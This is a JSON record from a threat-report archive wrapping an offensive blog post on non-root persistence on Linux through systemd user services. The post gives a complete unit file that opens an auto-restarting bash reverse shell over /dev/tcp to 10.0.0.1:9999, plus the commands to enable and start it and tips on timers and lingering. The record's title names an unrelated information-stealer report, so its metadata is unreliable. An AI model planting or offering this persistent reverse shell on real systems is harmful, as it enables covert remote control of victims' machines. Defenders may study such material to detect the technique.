{
    "id": "172c6120-4623-4e1a-8e7f-34ceeb5d2030",
    "created_at": "2023-01-12T15:07:17.035087Z",
    "updated_at": "2025-03-27T02:05:23.311787Z",
    "deleted_at": null,
    "sha1_hash": "f9ecf3d7a14273463a8965d024e2d9a532c51209",
    "title": "2016-12-06 - August in November- New Information Stealer Hits the Scene",
    "authors": "",
    "file_creation_date": "2022-01-17T12:51:41Z",
    "file_modification_date": "2022-01-17T12:51:41Z",
    "file_size": 84586,
    "plain_text": "# Systemd user level persistence. There are multiple ways to keepâ€¦ | by Alexey Petrenko\n\n**[medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)**\n\nJuly 10, 2018\n\n**Systemd user level persistence**\n\nThere are multiple ways to keep persistence on a Linux system after getting initial foothold. If\nyou have root access, there is literally infinite number of ways to do so: you can backdoor any\npart of a system. However, sometimes you do not have root access and you do not really need\nit, but it is always nice to keep an access to the system after it reboots.\n\nHere I will show one way of achieving persistence on most modern Linux systems without\nhaving root access. For some reason this method does not seem to be getting enough\nattention.\n\nIt is stupidly simple: use systemd user service.\n\n## An Example\n\n 1.\n\nPlace a service file in `~/.config/systemd/user/ .`\n\nHere is a `rs.service file used for a demo:`\n```\n[Unit]\nDescription=Just a reverse shell[Service]\nExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'\nRestart=always\nRestartSec=60[Install]\nWantedBy=default.target\n\n## 2.\n\n```\nEnable the service with `systemctl --user enable rs.service`\n\n## Profit\n\nThat is it. On the next user login systemd will happily start a reverse shell.\n\n\n-----\n\nYou can start it right away with `systemctl --user start rs.service if you don t want`\nto wait for a next time system reboots.\n\nThe nice thing is that you can use most systemd features here. In the example above, I used\n```\nRestart to restart a shell automatically on a failure. You may want to use systemd timers to\n\n```\nrun your payload periodically and not have a process constantly running if that is what you\nwant.\n\n## Limitations\n\nBy default, `systemd --user is only started when a user logs in and a session is started. So,`\nthis persistence method is mostly suited for desktops or kiosks and would be useless for\nservers with no active user sessions.\n\nIt is possible to change this behavior and start `systemd --user on boot rather than on user`\nlogin. To do so, a root must run `loginctl enable-linger <username> . Obviously, we`\nhave no root access and cannot change these settings. But it is worth checking if it has\nalready been enabled. In order to do so, look in `/var/lib/systemd/linger directory. If`\nlingering is enabled for a user `username, there should be an empty file with a name`\n\n`username . (Per` [this amazing answer)](https://serverfault.com/a/849280)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Persistence/Systemd user level persistence.pdf"
    ],
    "report_names": [
        "Systemd user level persistence.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536037,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1642423901,
    "ts_modification_date": 1642423901,
    "files": {
        "pdf": "https://archive.orkl.eu/f9ecf3d7a14273463a8965d024e2d9a532c51209.pdf",
        "text": "https://archive.orkl.eu/f9ecf3d7a14273463a8965d024e2d9a532c51209.txt",
        "img": "https://archive.orkl.eu/f9ecf3d7a14273463a8965d024e2d9a532c51209.jpg"
    }
}